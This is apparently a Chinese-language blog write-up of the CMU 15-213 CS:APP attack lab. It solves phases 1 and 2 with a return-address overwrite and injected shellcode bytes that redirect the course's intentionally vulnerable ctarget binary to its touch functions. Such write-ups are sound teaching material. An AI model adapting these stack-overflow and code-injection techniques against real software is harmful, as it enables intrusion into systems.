---
layout: post
title: "03 attack lab"
category: Csapp Lab(cmu 15-213)
---

CSAPP attack lab

# Attack_LAB

![image-20231219160940326](/assets/Attack_LAB/image-20231219160940326.png)

```
1.执行文件变成汇编
objdump -d ./ctarget > ctarget.s

2.有时候需要注入汇编代码，因此需要把想要的汇编代码需要转成二进制
gcc -c ans.s
objdump -d ans.o > ans.txt

3.结果，答案写在 exeample.txt，需要通过./hex2raw去注入
./hex2raw < exeample.txt | ./ctarget -q
```



## phase_1

```c
test(){
	getbuf()
     xxx
	return
}
通过溢出
1. test()->touch1()
```

原本getbuf之后，根据ret地址，执行xxx代码，目的是通过getbuf溢出修改ret地址，走到目标代码

gdb调试ctarget，使用-q 不连接服务器

![image-20231219161220379](/assets/Attack_LAB/image-20231219161220379.png)

test汇编

![image-20231219161110542](/assets/Attack_LAB/a1.png)

test调用 call getbuf 之后栈帧结构，由于getbuf执行完之后，需要执行下一行代码（0x401976），所以把代码地址保存再栈上面如下0x5561dca0 - 0x5561dca2,一个地址保存一字节，小端存储（低地址0x5561dca0保存最低位76）

![image-20231219161110542](/assets/Attack_LAB/attack0.png)

可以验证

![image-20231219170202518](/assets/Attack_LAB/attack2.png)

getbuf汇编

![image-20231219161053446](/assets/Attack_LAB/a4.png)



进入getbuf，call gets之前的栈帧结构

可以看到rsp，往下40(0x28)个单位，变成了0x5561dc78

![image-20231219161053446](/assets/Attack_LAB/a3.png)



走到gets方法 输入0123456789查看栈的样子,从rsp（0x5561dc78）作为起点，开始填充我们输入的内容

![image-20231219170202518](/assets/Attack_LAB/a5.png)

可以验证

![image-20231219170202518](/assets/Attack_LAB/attack1.png)

所以我们要输入43的字符，40个填充buff缓冲区，剩下3个40 17 c0填充ret指向touch1的地址

由于提示读取文件所以要得到0x4017c0,文本中应该是 

c0 17 40

![image-20231219170202518](/assets/Attack_LAB/image-20231219170202518.png)

所以答案,保存在ctarget1.txt中

```
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
c0 17 40 00 00 00 00 00
```

![image-20231219170412388](/assets/Attack_LAB/image-20231219170412388.png)

## phase_2

```c
test(){
	getbuf()
     xxx
	return
}
通过溢出
1. test()->touch2()

2. 比较cookie和val是否相同
void touch2(unsigned val)
{
  vlevel = 2; /* Part of validation protocol */
  if (val == cookie)
  {
    printf("Touch2!: You called touch2(0x%.8x)\n", val);
    validate(2);
  }
  else
  {
    printf("Misfire: You called touch2(0x%.8x)\n", val);
    fail(2);
  }
  exit(0);
}
```

已知cookie在cookie.txt中（0x59b997fa）

val的参数是%rdi中，

想要让val==cookie, 因此需要手动给val赋值为 0x59b997fa，即（mov 0x59b997fa  %rdi）

为了实现这个步骤，不能直接修改之前的ret，跳入touch2，需要先mov 0x59b997fa  %rdi之后再进入touch2

思路是，先修改ret到mov 0x59b997fa  %rdi的位置，再跳到touch2

先ret到缓冲区，再缓冲区注入汇编代码

```
movq $0x59b997fa,%rdi
pushq $0x004017ec  #touch
retq   #ret：弹出rsp指向的地址，作为下一条要执行代码的地址。会让rsp+8
```

注入之后的代码

![image-20231220112823637](/assets/Attack_LAB/p1a2.png)



要执行的目标代码



![image-20231220110724164](/assets/Attack_LAB/image-20231220110724164.png)

把汇编转化为机器代码（十六进制的表示）

![image-20231220113007901](/assets/Attack_LAB/image-20231220113007901.png)

48 c7 c7 fa 97 b9 59 68 ec 17 40 00  c3

填入buff文本，

![image-20231220112616836](/assets/Attack_LAB/image-20231220112616836.png)

并生成十六进制文件

![image-20231220112720748](/assets/Attack_LAB/image-20231220112720748.png)

执行代码

![image-20231220112751906](/assets/Attack_LAB/image-20231220112751906.png)



![image-20231220113837068](/assets/Attack_LAB/image-20231220113837068.png)
